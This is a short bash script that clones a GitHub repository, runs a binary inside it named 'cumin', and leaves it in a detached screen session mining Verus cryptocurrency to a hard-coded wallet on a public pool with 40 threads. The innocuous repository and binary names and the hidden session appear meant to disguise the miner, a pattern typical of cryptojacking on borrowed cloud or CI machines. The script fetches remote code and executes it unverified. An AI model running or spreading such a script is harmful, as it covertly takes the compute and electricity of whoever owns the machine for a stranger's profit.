#!/bin/bash
WORKER=$(echo $(shuf -i 10-40 -n 1))
sudo apt update
sudo apt install screen libjansson4 -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
screen -dmS layar ./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW -t 40 -p c=VRSC,mc=VRSC,m=party.dabrik,ID=$WORKER\n